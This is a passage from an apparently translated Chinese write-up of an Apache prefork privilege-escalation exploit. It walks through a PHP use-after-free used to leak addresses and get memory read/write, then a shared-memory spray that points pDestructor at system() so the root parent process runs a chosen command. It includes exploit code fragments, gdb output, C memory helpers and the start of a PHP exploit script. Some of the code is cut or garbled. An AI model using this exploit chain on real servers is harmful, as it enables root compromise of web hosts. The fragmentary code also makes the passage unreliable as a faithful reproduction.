  * 使all_buckets [bucket]指向该结构
  * 等待早上6:25获得任意函数调用
问题：PHP不允许读写/proc/self/mem， 这会阻止我们利用简单方法编辑共享内存
#### 获取工作进程内存的R/W访问权限
##### PHP UAF 0-day
由于mod_prefork经常与mod_php结合使用，因此通过PHP利用漏洞似乎很自然。我们使用PHP 7.x中的0day
UAF（这似乎也适用于PHP5.x）来完成利用(也可以利用CVE-2019-6977)
    y;
        return $this;
      }
    }
    function get_aslr()
    {
      global $p, $y;
      $p = 0;
      $y = [new X('PT1S')];
      json_encode([1234 => &$y]);
      print("ADDRESS: 0x" . dechex($p) . "\n");
      return $p;
    }
    get_aslr();
这是PHP对象上的UAF： 我们unset $y[0]（X的一个实例），但它仍然可以通过$this使用。
##### UAF导致读/写
我们希望实现两件事：
  * 读取内存以查找all_buckets的地址
  * 编辑共享内存，修改bucket，添加我们自定义的恶意结构
幸运的是，PHP的堆位于内存中的那两个之前。
PHP堆，ap_scoreboard_image，all_buckets的内存地址
    root@apaubuntu:~# cat /proc/6318/maps | grep libphp | grep rw-p
    7f4a8f9f3000-7f4a8fa0a000 rw-p 00471000 08:02 542265 /usr/lib/apache2/modules/libphp7.2.so
    (gdb) p *ap_scoreboard_image 
    $14 = {
      global = 0x7f4a9323e008, 
      parent = 0x7f4a9323e020, 
      servers = 0x55835eddea78
    }
    (gdb) p all_buckets 
    $15 = (prefork_child_bucket *) 0x7f4a9336b3f0
由于我们在PHP对象上触发UAF，因此该对象的任何属性也将是UAF; 我们可以将这个zend_object
UAF转换为zend_string。因为zend_string的结构非常有用：
    (gdb) ptype zend_string
    type = struct _zend_string {
        zend_refcounted_h gc;
        zend_ulong h;
        size_t len;
        char val[1];
    }
len属性包含字符串的长度。 通过递增它，我们可以在内存中进一步读写，从而访问我们感兴趣的两个内存区域:共享内存和all_buckets。
##### 定位bucket index 和 all_buckets
我们需要修改ap_scoreboard_image->parent[worker_id]->bucket中的parent结构中的bucket。幸运的是，parent结构总是处于共享内存块的开始，因此很容易找到：
    ➜  /www curl 127.0.0.1
    PID: 14380
    7f8a19da9000-7f8a19dc1000 rw-s 00000000 00:04 61736                      /dev/zero (deleted)
    ➜  /www 
    (gdb) p &ap_scoreboard_image->parent[0]
    $1 = (process_score *) 0x7f8a19da9040
    (gdb) p &ap_scoreboard_image->parent[1]
    $2 = (process_score *) 0x7f8a19da9064
    (gdb) 
为了定位到all_buckets,我们可以利用我们对prefork_child_bucket结构的了解:
    prefork_child_bucket {
        ap_pod_t *pod;
        ap_listen_rec *listeners;
        apr_proc_mutex_t *mutex; mutex 与 all_buckets[0]
位于同一个内存区域中（我的是第一个heap内存区域中）。apr_proc_mutex_unix_lock_methods_t是一个静态结构，位于libapr的.data，因此meth指针指向libapr中的data段中，且apr_proc_mutex_unix_lock_methods_t结构中的函数，位于libapr中的text段中。
由于我们可以通过/proc/self/maps来了解这些内存区域，我们可以遍历Apache内存中的每一个指针，找到一个匹配该结构的指针，这将是all_buckets
[0]。
注意，all_buckets的地址在每次正常重启时都会发生变化。这意味着当我们的漏洞触发时，all_buckets的地址将与我们找到的地址不同。
必须考虑到这一点; 我们稍后会解决该问题。
#### 向共享内存中写入恶意prefork_child_bucket结构
任意函数调用的代码路径如下
    bucket_id = ap_scoreboard_image->parent[id]->bucket
    my_bucket = all_buckets[bucket_id]
    mutex = &my_bucket->mutex
    apr_proc_mutex_child_init(mutex)
    (*mutex)->meth->child_init(mutex, pool, fname)
为了利用，我们使(mutex)->meth->child_init指向zend_object_std_dtor(zend_object
object),这产生以下链:
    mutex = &my_bucket->mutex
    [object = mutex]
    zend_object_std_dtor(object)
    ht = object->properties
    zend_array_destroy(ht)
    zend_hash_destroy(ht)
    val = &ht->arData[0]->val
    ht->pDestructor(val)
pDestructor 使其指向system函数，&ht->arData[0]->val为system函数的字符串。
如我们所见，两个最左边的两个结构是可以叠加的(prefork_child_bucket,zend_object结构)。
#### 使all_buckets [bucket]指向恶意构造的结构
由于all_buckets地址在每次优雅重启之后会改变，我们需要对其进行改进，有两种改进：喷射共享内存和使用每个process_score结构。
##### 喷射共享内存
如果all_buckets的新地址离旧地址不远，my_bucket将会大概指向我们的结构。因此，我们可以将其全部喷射在共享内存的未使用部分上，而不是将我们的prefork_child_bucket结构放在共享内存的精确位置。但是问题是，该结构也用于作为zend_object结构，因此它的大小为（5
* 8）40个字节以包含zend_object.properties字段。在共享内存中，喷射该混合结构，对我们没有帮助。
为了解决该问题，我们叠加apr_proc_mutex_t和zend_array结构，并将其地址喷洒在共享内存的其余部分。影响将是prefork_child_bucket.mutex和zend_object.properties指向同一地址。
现在，如果all_bucket重新定位没有远离其原始地址，my_bucket将位于喷射区域。
##### 使用每个process_score结构
每个Apache工作进程都有一个关联的process_score结构，并且每一个都有一个bucket索引。我们可以改变它们中的每一个，而不是改变一个process_score.bucket值，以使它们覆盖内存的另一部分。
例如：
    ap_scoreboard_image->parent[0]->bucket = -10000 -> 0x7faabbcc00 parent[1]->bucket = -20000 -> 0x7faabbdd00 parent[2]->bucket = -30000 -> 0x7faabbff00 
    #include 
    long read_mem(long addr)
    {
        return (unsigned long)(*((uint8_t*)(addr)));
    }
    [root@bogon php-extension]# cat write_mem.c 
    #include 
    #include 
    void write_mem(long addr,long data)
    {
        *((uint8_t*)addr) = data;
    }
    [root@bogon php-extension]# 
#### 问题
我在Apache 2.4.38 与 Apache
2.4.25中，测试发现all_buckets的地址与共享内存的地址之间的差值，远远不是一个4字节能表示的（bucket索引4字节）。所以在我的演示中，需要通过gdb来修改
    my_bucket = &all_buckets[bucket];//prefork.c:685
my_bucket的值，来模拟修改bucket，使其指向恶意的prefork_child_bucket结构。
#### PHP利用代码
    <?php
    function read_mem_dword($addr)
    {
        $ret = 0;